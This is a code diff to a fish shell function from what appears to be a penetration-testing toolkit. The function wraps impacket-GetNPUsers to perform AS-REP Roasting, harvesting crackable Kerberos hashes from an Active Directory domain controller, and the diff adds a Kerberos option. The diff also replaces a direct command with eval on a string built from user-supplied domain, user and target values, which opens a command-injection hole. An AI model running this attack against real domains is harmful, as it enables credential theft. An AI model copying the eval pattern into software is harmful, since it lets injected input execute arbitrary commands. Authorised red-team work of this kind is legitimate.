@@ -1,6 +1,6 @@
 # description: Run AS-REP Roasting using impacket-GetNPUsers
 function _kronos_asrep_roast --description "Run AS-REP Roasting using impacket-GetNPUsers"
-    argparse h/help u/username= d/domain= -- $argv
+    argparse h/help u/username= d/domain= k/kerberos -- $argv
     or return 1
 
     if set -q _flag_help
@@ -14,6 +14,7 @@ function _kronos_asrep_roast --description "Run AS-REP Roasting using impacket-G
         echo "Options:"
         echo "  -u, --username USER Provide username (falls back to \$TGT_USERNAME)"
         echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_AD_DOMAIN)"
+        echo "  -k, --kerberos      Use Kerberos authentication (requires KRB5CCNAME)"
         echo "  -h, --help          Show this help message"
         return 0
     end
@@ -56,6 +57,11 @@ function _kronos_asrep_roast --description "Run AS-REP Roasting using impacket-G
         return 1
     end
 
+    set -l cmd_str "impacket-GetNPUsers \"$domain/$user\" -dc-ip \"$target\" -no-pass -request"
+    if set -q _flag_kerberos
+        set cmd_str "$cmd_str -k"
+    end
+
     echo "Running impacket-GetNPUsers against $target for user $user@$domain..."
-    impacket-GetNPUsers "$domain/$user" -dc-ip $target -no-pass -request
+    eval $cmd_str
 end
